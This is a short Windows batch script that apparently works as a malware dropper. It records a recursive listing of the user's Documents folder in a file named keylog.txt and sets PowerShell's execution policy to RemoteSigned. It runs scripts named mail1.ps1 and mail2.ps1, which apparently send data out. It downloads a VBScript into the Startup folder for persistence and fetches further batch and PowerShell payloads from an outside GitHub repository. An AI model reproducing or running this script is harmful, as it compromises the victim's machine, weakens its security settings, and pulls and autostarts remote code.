cd/
@echo off
cd %USERPROFILE%\OneDrive\Documents\
dir /s > keylog.txt
@echo off
powershell Set-ExecutionPolicy RemoteSigned
powershell Get-ExecutionPolicy
powershell c:/%USERPROFILE%\OneDrive\Documents\mail2.ps1
powershell c:/%USERPROFILE%\OneDrive\Documents\mail1.ps1
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
WScript C:\%USERPROFILE%\OneDrive\Documents\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/menu.vbs
cd %USERPROFILE%\OneDrive\Documents\
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail1.ps1
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail2.ps1
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/download.vbs
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/start.bat
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/go.bat